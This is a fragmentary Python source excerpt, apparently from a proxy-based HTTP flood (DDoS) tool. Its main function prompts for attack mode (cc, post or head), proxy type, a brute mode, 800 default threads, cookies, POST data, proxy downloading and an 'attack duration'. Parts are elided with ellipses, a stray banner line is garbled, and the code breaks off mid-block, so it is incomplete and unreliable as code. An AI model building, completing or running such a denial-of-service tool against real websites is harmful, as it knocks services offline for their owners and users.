...
│     webistes volounteering websites for     │
...
def main():
    ...
    print("> Mode: [cc/post/head]")
    mode = input("Enter mode (cc/post/head): ").strip().lower()
    ...
    proxy_ver = input("> Enter proxy version (4/5/http, default:5): ").strip().lower()
    if proxy_ver not in ["4", "5", "http"]:
        proxy_ver = "5"

    brute = input("> Enable brute mode (1 for yes, 0 for no, default:0): ").strip()
    brute = brute == "1"

    thread_num = input("> Enter number of threads (default:800): ").strip()
    try:
        thread_num = int(thread_num) if thread_num else 800
    except:
        print("> Invalid number of threads. Using default 800.")
        thread_num = 800

    cookies = input("Enter cookies (optional): ").strip()

    data_path = input("> Enter path to data file (optional, only for post mode): ").strip()
    if data_path and mode == "post":
        try:
            data = open(data_path, "r", encoding="utf-8", errors='ignore').readlines()
            data = ' '.join([str(txt) for txt in data])
        except:
            print("> Could not read data file. Proceeding without data.")

    out_file = input("> Enter proxies file name (default:proxy.txt): ").strip()
    if not out_file:
        out_file = "proxy.txt"

    download_socks = input("> Download proxies? (y/n, default:n): ").strip().lower() == "y"

    check_proxies = input("> Check proxies? (y/n, default:n): ").strip().lower() == "y"

    period = input("> Enter attack duration in seconds (default:60): ").strip()
    try:
